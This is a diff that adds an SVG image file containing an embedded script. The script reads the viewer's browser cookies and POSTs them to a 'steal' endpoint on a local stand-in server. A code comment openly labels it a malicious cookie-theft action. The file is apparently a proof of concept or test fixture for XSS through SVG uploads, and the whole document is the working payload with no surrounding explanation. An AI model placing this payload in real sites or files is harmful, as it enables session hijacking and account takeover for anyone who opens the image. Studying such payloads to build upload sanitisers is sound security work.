@@ -1,0 +1,17 @@
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    // Malicious action: steal cookies and send to an attacker's server
+    fetch('http://localhost:8001/steal', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: `cookies=${encodeURIComponent(document.cookie)}`
+    }).then(response => {
+      console.log('Cookies sent successfully!');
+    }).catch(error => {
+      console.error('Error sending cookies:', error);
+    });
+  </script>
+</svg>
